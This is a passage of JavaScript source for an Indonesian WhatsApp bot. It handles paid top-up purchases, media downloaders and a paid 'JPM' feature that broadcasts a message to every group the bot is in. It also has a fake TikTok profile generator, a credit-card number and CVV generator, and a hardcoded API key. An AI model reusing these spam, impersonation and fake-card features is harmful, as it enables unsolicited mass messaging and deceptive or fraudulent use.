db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* Jasa Jpm Pesan
`}, {quoted: db.users[m.sender].saweria.msg})

let rest
if (Obj.img !== undefined) {
rest = await conn.downloadAndSaveMediaMessage(Obj.img)
}
const allgrup = await conn.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const ttks = Obj.pesan
const pesancoy = rest !== undefined ? { image: await fs.readFileSync(rest), caption: ttks } : { text: ttks }
const opsijpm = rest !== undefined ? "teks & foto" : "teks"
const jid = m.chat
await m.reply(`Memproses jpm *${opsijpm}* ke ${res.length} grup chat`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await conn.sendMessage(i, pesancoy, {quoted: qlocJpm})
count += 1
} catch {}
await sleep(global.delayJpm)
}
if (rest !== undefined) await fs.unlinkSync(rest)
await conn.sendMessage(jid, {text: `Jpm *${opsijpm}* berhasil dikirim ke ${res.length} grup chat`}, {quoted: m})
await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}
}
break

case "claude":
 {
 let talk = m.quoted ? m.quoted.text : (text ? text : "Hai");
 await fetchJson(`https://vapis.my.id/api/claude?q=${talk}`)
 .then(async (res) => {
 await m.reply(res.result);
 })
 .catch((e) => m.reply(e.toString()));
 }
 break
 
case "googledrive": case "gdrive": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith("https://")) return m.reply(example("linknya"))
try {
    const res = await fetchJson(`https://restapi-v2.simplebot.my.id/download/gdrive?url=${text}`)
   await conn.sendMessage(m.chat, { document: { url: res.result.downloadUrl }, mimetype: res.result.mimetype, fileName: `${res.result.fileName}`}, { quoted : m })
} catch (e) {
await m.reply(`Error! result tidak ditemukan`)
}}
break

case 'terabox': {
    if (!text) return m.reply(`Gunakan: ${prefix + command} <url>\n\nContoh: ${prefix + command} https://terabox.com/s/1B1nTfxPq9_Ib-rf_M_6oFg`);
    const axios = require("axios");
    async function teraboxdl(url) {
        try {
            const apiUrl = `https://teraboxdownloaderonline.com/api/download-m3u8?terabox_link=${encodeURIComponent(url)}`;
            const headers = {
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36",
                "Referer": `https://teraboxdownloaderonline.com/player?url=${encodeURIComponent(url)}`,
            };
            const response = await axios.get(apiUrl, { headers });
            const match = response.data.match(/#EXTINF:\d+,\s*(https[^\s]+)/);
            if (match && match[1]) {
                return { status: "success", video_url: match[1] };
            } else {
                return { status: "error", message: "❌ Video URL tidak ditemukan." };
            }
        } catch (error) {
            return { status: "error", message: "❌ Terjadi kesalahan saat mengambil data.", error: error.message };
        }
    }
    try {
        await conn.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });
        let result = await teraboxdl(text);
        if (result.status !== "success") return m.reply(result.message);
        await conn.sendMessage(m.chat, { react: { text: '📥', key: m.key } });
        await conn.sendMessage(m.chat, {
            video: { url: result.video_url },
            mimetype: 'video/mp4',
            caption: `✅ *Berhasil mengunduh dari Terabox!*`
        }, { quoted: m });
        await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
    } catch (err) {
        console.error(err);
        m.reply("❌ Terjadi kesalahan.");
    }
}
break

case "svsc": {
if (!isCreator) return
if (!text || !text.endsWith(".zip")) return m.reply(example("cpanel.zip & reply scnya"))
if (!/zip/.test(mime)) return m.reply(example("cpanel.zip & reply scnya"))
if (!m.quoted) return m.reply(example("cpanel & reply scnya"))
let ff = await m.quoted.download()
let nama = text
await fs.writeFileSync("./library/database/savesc/"+nama, ff)
return m.reply(`Berhasil menyimpan script *${nama}.zip*`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listsc": {
if (!isCreator) return
let scnya = await fs.readdirSync("./library/database/savesc").filter(i => i !== "verif.js")
if (scnya.length < 1) return m.reply("Tidak ada script tersimpan")
let teks = ""
for (let e of scnya) {
teks += e + "\n"
}
m.reply(teks)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case 'setapido': case 'setapidigitalocean': case 'upapido': {
    if (!isCreator) return m.reply('*[ System Notice ]* Khusus Owner');
    if (text || m.quoted) {
        const newteks = m.quoted ? m.quoted.text : text;
        global.apiDigitalOcean = newteks;
        
        try {
            const fs = require('fs');
            const path = './settings.js'; 
           let content = fs.readFileSync(path, 'utf8');
            const apidoRegex = /(global\.apiDigitalOcean\s*=\s*['"`])([^'"`]*?)(['"`])/;
            content = content.replace(apidoRegex, `$1${newteks}$3`);
            fs.writeFileSync(path, content);
            await conn.sendMessage(m.chat, { text: "_Berhasil Mengganti Api Digital Ocean✅_" }, { quoted: m });
        } catch (error) {
            console.error('Error updating settings.js:', error);
            await conn.sendMessage(m.chat, { text: "_Gagal menyimpan perubahan ke file settings.js_" }, { quoted: m });
        }
    } else {
        await conn.sendMessage(m.chat, { text: `*Format salah!*\nContoh: ${prefix + command} <apidigitalocean>` }, { quoted: m });
    }
}
break
case 'getpastebin': {
  if (!q) return m.reply('Masukkan link Pastebin!\nContoh: getpastebin https://pastebin.com/raw/abc123');

  try {
    const res = await fetch(`https://api.nekorinn.my.id/tools/getpastebin?url=${encodeURIComponent(q)}`);
    const json = await res.json();
    if (!json.status) return m.reply('Gagal mengambil data.');
    let content = json.result.content
      .split('\n')
      .filter(line => !line.trim().startsWith('//'))
      .join('\n');
    m.reply(content);
  } catch (e) {
    console.error(e);
    m.reply('Terjadi kesalahan saat memproses.');
  }
}
  break
case "sendsc2": {
if (!isCreator) return 
let scnya = await fs.readdirSync("./library/database/savesc").filter(i => i !== "verif.js")
if (scnya.length < 1) return m.reply("Tidak ada script tersimpan")
if (!text) return m.reply(example("namasc|6285###"))
if (!text.split("|'")) return m.reply(example("namasc|6285###"))
const input = m.mentionedJid[0] ? m.mentionedJid[0] : text.split("|")[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net"
var onWa = await conn.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return m.reply("Nomor tidak terdaftar di whatsapp")
let namasc = text.split("|")[0]
namasc = namasc.toLowerCase()
if (!scnya.includes(namasc)) return m.reply('Nama script tidak ditemukan')
await conn.sendMessage(input, {document: fs.readFileSync("./library/database/savesc/"+namasc), fileName: namasc, mimetype: "application/zip", caption: `Script ${namasc}`}, {quoted: m})
m.reply(`Berhasil mengirim script *${namasc}* ke ${input.split("@")[0]}`)
}
break
case 'faketiktok': case 'tiktokfake': {
  if (!text) {
    return conn.sendMessage(m.chat, {
      text: `*Fake TikTok Profile Generator*\n\n` +
            `Kirim perintah dengan format:\n` +
            `*${prefix + command}* Nama|Username|Followers|Following|Likes|Bio|Verified(true/false)|isFollow(true/false)|dark/light\n\n` +
            `Contoh:\n` +
            `*${prefix + command}* Apa Kek|Yubi|4020030|12|789000|Beginner in coding, but I love it! Follow me for more coding tips and tricks.|true|true|dark`
    }, { quoted: m });
  }
  let [name, username, followers, following, likes, bio, verified = 'true', isFollow = 'true', dark = 'true'] = text.split('|')
  if (!name || !username || !followers || !following || !likes || !bio) {
    return m.reply('Format salah.\nCoba ikuti contoh:\nNama|Username|Followers|Following|Likes|Bio|Verified|isFollow|Theme')
  }
  let ppUrl = await conn.profilePictureUrl(m.sender, 'image').catch(() => 'https://telegra.ph/file/2f61d40b7cfb440f3cfa7.jpg')
  let apiUrl = `https://flowfalcon.dpdns.org/imagecreator/faketiktok?name=${encodeURIComponent(name)}&username=${encodeURIComponent(username)}&pp=${encodeURIComponent(ppUrl)}&verified=${verified}&followers=${followers}&following=${following}&likes=${likes}&bio=${encodeURIComponent(bio)}&dark=${dark}&isFollow=${isFollow}`

  try {
const axios = require('axios');
    let { data } = await axios.get(apiUrl, { responseType: 'arraybuffer' })
    const buffer = Buffer.from(data)
    const FormData = (await import('form-data')).default
    const form = new FormData()
    form.append('reqtype', 'fileupload')
    form.append('userhash', '')
    form.append('fileToUpload', buffer, 'tiktokfake.jpg')
    const upres = await axios.post('https://catbox.moe/user/api.php', form, {
      headers: form.getHeaders()
    })
    if (!upres.data || !upres.data.includes('catbox')) return m.reply('Gagal upload gambar.')
    conn.sendMessage(m.chat, {
      image: { url: upres.data }
    }, { quoted: m })
  } catch (e) {
    console.error(e)
    m.reply('Terjadi kesalahan saat membuat gambar.')
  }
}
  break
case 'twitter2': case 'twdown2': {
  if (!q) return m.reply('Link Twitter-nya mana?');
  if (!q.includes('twitter.com')) return m.reply('Link tidak valid!');

  try {
    const axios = require("axios");
    const FormData = require("form-data");
    const cheerio = require("cheerio");
    let form = new FormData();
    form.append("q", q);
    form.append("lang", "en");
    form.append("cftoken", "");
    let headersList = {
      headers: {
        ...form.getHeaders()
      }
    };
    let { data } = await axios.post("https://savetwitter.net/api/ajaxSearch", form, headersList);
    if (!data.data) return m.reply("Data kosong / tidak ditemukan");
    const $ = cheerio.load(data.data);
    const thumbnail = $(".image-tw img").attr("src");
    const result = [];
    $(".dl-action a").each((_, el) => {
      const link = $(el).attr("href");
      const label = $(el).text().trim();
      if (link && label.includes("Download MP4")) {
        result.push({
          quality: label.replace("Download MP4", "").trim().replace("(", "").replace(")", ""),
          url: link,
          thumbnail
        });
      }
    });
    if (result.length === 0) return m.reply("Video tidak ditemukan.");
    let caption = `*Semua Kualitas Tersedia:*\n\n`;
    result.forEach((v, i) => {
      caption += `${i + 1}. *${v.quality}*\n${v.url}\n\n`;
    });
    await conn.sendMessage(m.chat, { text: caption }, { quoted: m });
    const video1280 = result.find(v => v.quality.includes("1280"));
    if (video1280) {
      await conn.sendMessage(m.chat, {
        video: { url: video1280.url },
        caption: `Berikut video kualitas *${video1280.quality}*`
      }, { quoted: m });
    } else {
      await conn.sendMessage(m.chat, { text: "Video kualitas 1280 tidak ditemukan." }, { quoted: m });
    }
  } catch (e) {
    console.error(e);
    m.reply("Terjadi kesalahan saat memproses permintaan.");
  }
}
break
case 'twdown': case 'twitter':
  if (!q) return m.reply('Masukkan URL Twitter/X!\nContoh: twdown https://x.com/Indomielovers/status/1917826490068279736')
  m.reply('Tunggu sebentar, sedang memproses...')

  try {
    const axios = require('axios')
    const cheerio = require('cheerio')
    const res = await axios.post('https://twmate.com/', new URLSearchParams({
      page: q,
      ftype: 'all',
      ajax: '1'
    }), {
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Accept': '*/*',
        'X-Requested-With': 'XMLHttpRequest',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36',
        'Referer': 'https://twmate.com/',
      }
    })
    const $ = cheerio.load(res.data)
    const videoLinks = []
    $('.btn-dl').each((index, element) => {
      const quality = $(element).parent().prev().text().trim()
      const downloadUrl = $(element).attr('href')
      if (downloadUrl.includes('.mp4')) {
        videoLinks.push({ quality, downloadUrl })
      }
    })
    if (videoLinks.length === 0) return m.reply('Gagal mengambil video. Pastikan URL benar dan video publik.')
    const best = videoLinks[0] 
    let caption = `*Download Twitter/X*\n\n`
    caption += `*Quality:* ${best.quality}\n`
    caption += `*Source:* ${q}\n\n`
    caption += `*Link Alternatif:*\n`
    videoLinks.forEach((v, i) => {
      caption += `${i + 1}. ${v.quality}: ${v.downloadUrl}\n`
    })
    await conn.sendMessage(m.chat, {
      video: { url: best.downloadUrl },
      caption: caption.trim()
    }, { quoted: m })
  } catch (e) {
    console.error(e)
    m.reply('Terjadi kesalahan saat memproses video.')
  }
  break
case "delsc": {
if (!isCreator) return 
let scnya = await fs.readdirSync("./library/database/savesc").filter(i => i !== "verif.js")
if (scnya.length < 1) return m.reply("Tidak ada script tersimpan")
if (!text) return m.reply(example("namasc"))
let namasc = text
namasc = namasc.toLowerCase()
if (!scnya.includes(namasc)) return m.reply('Nama script tidak ditemukan')
await fs.unlinkSync("./library/database/savesc/"+namasc)
m.reply(`Berhasil menghapus script *${namasc}*`)
}
break

case "topupdiamond": {
if (m.isGroup) return m.reply("Pembelian saldo dana hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
if (!argsbiyuoffc[0] || !argsbiyuoffc[0].split("|")) return m.reply(example("id|serverid"))
if (!argsbiyuoffc[1] || !argsbiyuoffc[1].split("|")) {
let nodana = argsbiyuoffc[0].split("|")[0]
let serverid = argsbiyuoffc[0].split("|")[1]
const axios = require('axios');
const { data } = await axios.get("https://www.okeconnect.com/harga/json?id=905ccd028329b0a");
 let dana = data.filter(item => /TPG Diamond Mobile Legends/i.test(item.produk) && item.harga > 0)
 .sort((a, b) => a.harga - b.harga);
 let dana1 = data.filter(item => /TPG Diamond Free Fire/i.test(item.produk) && item.harga > 0)
 .sort((a, b) => a.harga - b.harga);
 let dana2 = data.filter(item => /TPG Game Mobile PUBG/i.test(item.produk) && item.harga > 0)
 .sort((a, b) => a.harga - b.harga);
 let dana3 = data.filter(item => /TPG Stumble Guys/i.test(item.produk) && item.harga > 0)
 .sort((a, b) => a.harga - b.harga);
 dana = [...dana1, ...dana, ...dana2, ...dana3]

 let sections = dana.map((item) => {
 const status = item.status === "1" ? "✅" : "❌";
 return {
 title: `${item.keterangan}`,
 description: `Rp${item.harga}`, 
 id: `${prefix}topupdiamond ${nodana}|${serverid} ${item.kode}|${item.harga}|${item.keterangan}`
 };
})
return conn.sendMessage(m.chat, {
 buttons: [
 {
 buttonId: 'action',
 buttonText: { displayText: 'ini pesan interactiveMeta' },
 type: 4,
 nativeFlowInfo: {
 name: 'single_select',
 paramsJson: JSON.stringify({
 title: 'Pilih Jumlah',
 sections: [
 {
 title: 'List Layanan Topup Diamond',
 highlight_label: 'Recommended',
 rows: sections 
 }
 ]
 })
 }
 }
 ],
 footer: `© WhatsApp Botz`,
 headerType: 1,
 viewOnce: true,
 text: "Pilih Jumlah Topup Diamond\n",
 contextInfo: {
 isForwarded: true, 
 mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
 },
}, {quoted: m}) 
}
let Obj = {}
Obj.harga = argsbiyuoffc[1].split("|")[1]
Obj.nominal = argsbiyuoffc[1].split("|")[2]
Obj.kode = argsbiyuoffc[1].split("|")[0]
Obj.id = argsbiyuoffc[0].split("|")[0]
Obj.serverid = argsbiyuoffc[0].split("|")[1]
Obj.nodana = Obj.id + Obj.serverid
const UrlQr = global.qrisOrderKuota
const amount = Number(Obj.harga) + generateRandomNumber(110, 250)

const axios = require('axios');
const get = await axios.get(`https://simpelz.fahriofficial.my.id/api/orkut/createpayment?apikey=new2025&amount=${amount}&codeqr=${UrlQr}`)
const teks3 = `
*乂 INFORMASI PEMBAYARAN*
 
 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* ${Obj.nominal}
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *batalbeli* untuk membatalkan
`
let msgQr = await conn.sendMessage(m.chat, {
 footer: `${botname}`,
 buttons: [
 {
 buttonId: `${prefix}batalbeli`,
 buttonText: { displayText: 'Batalkan Pembelian' },
 type: 1
 }
 ],
 headerType: 1,
 viewOnce: true,
 image: {url: get.data.result.qrImageUrl}, 
 caption: teks3,
 contextInfo: {
 mentionedJid: [m.sender]
 },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const axios = require('axios');
const resultcek = await axios.get(`https://simpelz.fahriofficial.my.id/api/orkut/cekstatus?apikey=new2025&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.result?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* ${Obj.nominal}
`}, {quoted: db.users[m.sender].saweria.msg})
const idtrx = "BIYU" + `${Date.now()}`
await fetchJson(`https://h2h.okeconnect.com/trx?memberID=${global.merchantIdOrderKuota}&product=${Obj.kode}&dest=${Obj.nodana}&refID=&pin=${global.pinH2H}&password=${global.passwordH2H}`)
let statuse = true
while (statuse) {

let dt = await fetchJson(`https://h2h.okeconnect.com/trx?memberID=${global.merchantIdOrderKuota}&product=${Obj.kode}&dest=${Obj.nodana}&refID=&pin=${global.pinH2H}&password=${global.passwordH2H}`)
if (/status Sukses/.test(dt)) {
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: `
*Topup ${db.users[m.sender].saweria.keterangan} Berhasil ✅*

 *• Nomor Tujuan :* ${Obj.nodana}
 *• Status :* Sukses
`}, {quoted: db.users[m.sender].saweria.msg})
statuse = false
}
}
}
}
}
break
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "isipulsa": {
if (m.isGroup) return m.reply("Pembelian saldo dana hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
if (!argsbiyuoffc[0]) return m.reply(example("085XXX"))
if (!argsbiyuoffc[0].startsWith("08")) return m.reply(example("085XXX"))
if (!argsbiyuoffc[1] || !argsbiyuoffc[1].split("|")) {
let nodana = argsbiyuoffc[0].trim()
const axios = require('axios');
const { data } = await axios.get("https://www.okeconnect.com/harga/json?id=905ccd028329b0a");
        let dana = data.filter(item => /Axis Transfer/.test(item.produk) && item.harga > 0)
            .sort((a, b) => a.harga - b.harga);
        let dana0 = data.filter(item => /Telkomsel Transfer/.test(item.produk) && item.harga > 0)
            .sort((a, b) => a.harga - b.harga);
        let dana1 = data.filter(item => /Smartfren Transfer/.test(item.produk) && item.harga > 0)
            .sort((a, b) => a.harga - b.harga);
        let dana2 = data.filter(item => /Three Transfer/.test(item.produk) && item.harga > 0)
            .sort((a, b) => a.harga - b.harga);
        let dana3 = data.filter(item => /XL Transfer/.test(item.produk) && item.harga > 0)
            .sort((a, b) => a.harga - b.harga);   
 dana = [...dana, ...dana0, ...dana1, ...dana2, ...dana3]

        let sections = dana.map((item) => {
            const status = item.status === "1" ? "✅" : "❌";
            return {
                title: `${item.keterangan}`,
                description: `Rp${item.harga}`, 
                id: `${prefix}isipulsa ${nodana} ${item.kode}|${item.harga}|${item.keterangan}`
            };
})
return conn.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Jumlah',
          sections: [
            {
              title: 'List Layanan Isi Pulsa',
              highlight_label: 'Recommended',
              rows: sections             
            }
          ]
        })
      }
      }
  ],
  footer: `© WhatsApp Botz`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Nominal Isi Pulsa\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m}) 
}
let Obj = {}
Obj.harga = argsbiyuoffc[1].split("|")[1]
Obj.nominal = argsbiyuoffc[1].split("|")[2]
Obj.kode = argsbiyuoffc[1].split("|")[0]
Obj.nodana = argsbiyuoffc[0].trim()
const UrlQr = global.qrisOrderKuota
const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)
const axios = require('axios');
const get = await axios.get(`https://simpelz.fahriofficial.my.id/api/orkut/createpayment?apikey=new2025&amount=${amount}&codeqr=${UrlQr}`)
const teks3 = `
*乂 INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* ${Obj.nominal}
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *batalbeli* untuk membatalkan
`
let msgQr = await conn.sendMessage(m.chat, {
  footer: `${botname}`,
  buttons: [
    {
      buttonId: `${prefix}batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const axios = require('axios');
const resultcek = await axios.get(`https://simpelz.fahriofficial.my.id/api/orkut/cekstatus?apikey=new2025&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.result?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* ${Obj.nominal}
`}, {quoted: db.users[m.sender].saweria.msg})
const idtrx = "BIYU" + `${Date.now()}`
await fetchJson(`https://h2h.okeconnect.com/trx?memberID=${global.merchantIdOrderKuota}&product=${Obj.kode}&dest=${Obj.nodana}&refID=&pin=${global.pinH2H}&password=${global.passwordH2H}`)
let statuse = true
while (statuse) {
let dt = await fetchJson(`https://h2h.okeconnect.com/trx?memberID=${global.merchantIdOrderKuota}&product=${Obj.kode}&dest=${Obj.nodana}&refID=&pin=${global.pinH2H}&password=${global.passwordH2H}`)
if (/status Sukses/.test(dt)) {
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: `
*Topup ${db.users[m.sender].saweria.keterangan} Berhasil ✅*

 *• Nomor Tujuan :* ${Obj.nodana}
 *• Status :* Sukses
`}, {quoted: db.users[m.sender].saweria.msg})
statuse = false
break
}
await sleep(5000)
}
await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break
case 'convert': case 'convertmoney': {
 if (!text.includes('|')) return m.reply(`Gunakan format: ${prefix + command} <dari>|<ke>\nContoh: ${prefix + command} USD|IDR`);
 const axios = require('axios');
 const cheerio = require('cheerio');
 let [from, to] = text.split('|').map(v => v.trim().toUpperCase());
 async function convertCurrency(from, to) {
 const url = `https://www.xe.com/currencyconverter/convert/?Amount=1&From=${from}&To=${to}`;
 try {
 const { data } = await axios.get(url);
 const $ = cheerio.load(data);
 const conversionText = $('div[data-testid="conversion"]').find('p.hVDvqw').text().trim();
 const numberMatch = conversionText.match(/([\d,\.]+)/);
 if (numberMatch) {
 return parseFloat(numberMatch[0].replace(/,/g, ''));
 } else {
 throw new Error('Data konversi tidak ditemukan');
 }
 } catch (error) {
 console.error('Error:', error);
 throw error;
 }
 }
 await conn.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });
 try {
 let rate = await convertCurrency(from, to);
 m.reply(`💱 *Konversi Mata Uang*\n\n📌 1 ${from} = ${rate} ${to}\n🔗 *Sumber:* xe.com`);
 await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
 } catch (err) {
 console.error(err);
 m.reply("❌ Terjadi kesalahan saat mengambil data konversi.");
 }
}
break
case 'bagiteks':
case 'shareteks': {
    if (!q) return m.reply('Kirim teksnya kak!\nContoh:\nshareteks Ini teks contoh');
    try {
const axios = require('axios');
        const res = await axios.post('https://sharetext.io/api/text', { text: q }, {
            headers: {
                'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36',
                'Referer': 'https://sharetext.io/'
            }
        }); m.reply(`Done!\nhttps://sharetext.io/${res.data}`);
    } catch (e) {
        m.reply('Error: ' + e.message);
    }
}
break
case "vcc": case "cvcc": {
    try {
        let [type, jumlah] = args;
        let validTypes = ["MasterCard", "Visa", "Amex", "Discover"];
        if (!type || !validTypes.includes(type)) {
            return m.reply(`⚠️ Format salah! Pilih tipe: MasterCard, Visa, Amex, Discover.\n\n🔰 *Cara penggunaan:*\nKetik: *vcc <type> <jumlah>*\nContoh: *vcc Visa 3*`);
        }
        jumlah = jumlah && !isNaN(jumlah) ? parseInt(jumlah) : 5;
        if (jumlah < 1 || jumlah > 10) return m.reply("⚠️ Jumlah VCC minimal 1 dan maksimal 10!");
        const response = await fetch(`https://api.siputzx.my.id/api/tools/vcc-generator?type=${type}&count=${jumlah}`);
        const data = await response.json();
        if (!data.status || !data.data) return m.reply("⚠️ Gagal mengambil data VCC.");
        let message = `💳 *Virtual Credit Card (VCC) - ${type}*\n\n`;
        data.data.forEach((card, index) => {
            message += ` *Card ${index + 1}*\n` +
                `• 🏷️ Name: ${card.cardholderName}\n` +
                `• 💳 Number: ${card.cardNumber}\n` +
                `• 📆 Exp: ${card.expirationDate}\n` +
                `• 🔐 CVV: ${card.cvv}\n\n`;
        });
        m.reply(message);
    } catch (err) {
        console.error(err);
        m.reply("⚠️ Terjadi kesalahan saat mengambil VCC.");
    }
}
    break
    
case "topupsaldo": {
if (m.isGroup) return m.reply("Pembelian saldo dana hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
if (!argsbiyuoffc[0]) return m.reply(example("085XXX"))
if (!argsbiyuoffc[0].startsWith("08")) return m.reply(example("085XXX"))
if (!argsbiyuoffc[1] || !argsbiyuoffc[1].split("|")) {
let nodana = argsbiyuoffc[0].trim()
const axios = require('axios');
const { data } = await axios.get("https://www.okeconnect.com/harga/json?id=905ccd028329b0a");
        let dana = data.filter(item => /Top Up Saldo GO-JEK/i.test(item.produk) && item.harga > 0)
            .sort((a, b) => a.harga - b.harga);
        let dana1 = data.filter(item => /Top Up Saldo DANA/i.test(item.produk) && item.harga > 0)
            .sort((a, b) => a.harga - b.harga);
        dana = [...dana1, ...dana]

        let sections = dana.map((item) => {
            const status = item.status === "1" ? "✅" : "❌";
            return {
                title: `${item.keterangan}`,
                description: `Rp${item.harga}`, 
                id: `${prefix}topupsaldo ${nodana} ${item.kode}|${item.harga}|${item.keterangan}`
            };
})
return conn.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Jumlah',
          sections: [
            {
              title: 'List Nominal Topup Saldo',
              highlight_label: 'Recommended',
              rows: sections             
            }
          ]
        })
      }
      }
  ],
  footer: `© WhatsApp Botz`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Jumlah Topup Saldo\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m}) 
}
let Obj = {}
Obj.harga = argsbiyuoffc[1].split("|")[1]
Obj.nominal = argsbiyuoffc[1].split("|")[2]
Obj.kode = argsbiyuoffc[1].split("|")[0]
Obj.nodana = argsbiyuoffc[0].trim()
const UrlQr = global.qrisOrderKuota
const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)

const axios = require('axios');
